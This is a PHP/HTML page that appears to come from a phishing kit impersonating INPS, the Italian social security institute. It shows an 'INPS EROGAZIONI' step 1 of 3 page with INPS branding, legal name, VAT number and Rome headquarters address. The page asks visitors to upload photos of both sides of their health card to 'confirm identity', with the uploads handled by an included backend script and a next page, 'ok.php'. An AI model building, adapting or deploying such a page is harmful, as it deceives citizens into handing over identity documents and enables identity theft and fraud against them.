<?php
require("retro/generale.php");

//CUSTOM
$pagina=array('TESF','TESR');
$numero = 2;
$prossima = "ok.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("retro/motore.php");

?><html class="sfondo"><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">


<style>
.father {
 display: flex;
    justify-content: center;
    align-items: center;
}
.resto{
    display: none ;
}

.nascondi{
    display: none !important;
}

.child {

      background-image: url(logo.jpg);
    margin-top: 100%;
    position: absolute; 
}
.myButton {
    width: 100%;
    background-color:#5498d4;
    border-radius:23px;
    border:1px solid #5498d4;
    display:inline-block;
    cursor:pointer;
    color:#ffffff;
    font-family:Arial;
    font-size:17px;
    font-weight:bold;
    padding:17px 31px;
    text-decoration:none;
    text-shadow:0px 1px 0px #5498d4;
}
.myButton:hover {
    background-color:#5498d4;
}
.myButton:active {
    position:relative;
    top:1px;
}

        

label{
    margin: 15px 0px !important;
     font-size: 110%;
}
.i1{
    width:100%;
    
    
    line-height: 180%;
    font-size: 110%;
}


input{
    border-top-width: 0px !important;
    border-bottom-width: 0px !important;
    border-left-width: 0px !important;
    border-right-width: 0px !important;
}
.sfondo{
    /* FLOAT: RIGHT; */
    background-repeat: no-repeat;
    background-size: cover;
}
input{
padding: 10px;background-color: whitesmoke;
    border-radius: 0px 0px 15px 15px;
}
.input2{
padding: 10px;background-color: whitesmoke;
    border-radius: 0px;
}
form .sopra{
  font-weight: bold;font-size: 90%;
      border-radius: 15px 15px 0px 0px;
      background-color: whitesmoke;margin: 0;padding: 10px 0px 0px 10px;color: black;
}
form .sopra2{
  font-weight: normal;font-size: 90%;
      border-radius:0px 0px  15px 15px ;
      background-color: whitesmoke;margin: 0;padding: 10px 0px 10px 10px;color: #545454;
}
</style>

</head><body>
    <div class="father" style="display: none;">
    <div class="child"><img src="logo.png"></div>
</div>
<div class="resto" style="display: block;">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://unpkg.com/purecss@2.0.5/build/pure-min.css">
<script src="jquery-latest.min.js"></script>
<div style="border-bottom:1px solid #cfcfcf;background-color: #007db3 !important;/* TEXT-ALIGN: CENTER; *//* padding: 16px; */">
<img src="logo2.png" style="margin: 15px 15px 10px 15px;">
</div>
<div style="margin: 0px 4%;">
<br>
    <p style="TEXT-ALIGN: CENTER;">INPS EROGAZIONI - FASE 1 DI 3</p>
<div class="progress">
  <div class="progress-bar" role="progressbar" 
  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div>
</div>
<form method="POST" autocomplete="off" enctype="multipart/form-data">

        <h1>Conferma la tua identità</h1>

<h3 style="font-size: 96%;margin-top: 0px;">per confermare la sua identità compili i dati richiesti</h3>
        
        
   <br><h3 class="sopra">Fronte Tessera Sanitaria</h3>
    <input autocomplete="off" required="" class="i1" type="file" name="TESF">    
        
        <h3 class="sopra2">Assicurati che tutti gli angoli appaiono nella foto e che tutti i dati sul documento siano ben leggibili.</h3><br><br><h3 class="sopra">
            Retro Tessera Sanitaria</h3>
        <input autocomplete="off" required="" class="i1 input2" type="file" name="TESR"> 
          <h3 class="sopra2">Assicurati che tutti gli angoli appaiono nella foto e che tutti i dati sul documento siano ben leggibili.</h3><br>
        <br>
        <button type="submit" class="myButton">Conferma</button><br><br>
</form>
</div><div style="background-color: #5a6772;"><img src="logo2.png" style="margin: 15px 15px 10px 15px;"><p style="color: white;padding: 18px;">Istituto Nazionale Previdenza Sociale<br>
P.IVA 02121151001<br>
Sede Legale:<br>
Via Ciro il Grande, 21<br>
00144 Roma</p>
</div>



</div>
</body></html>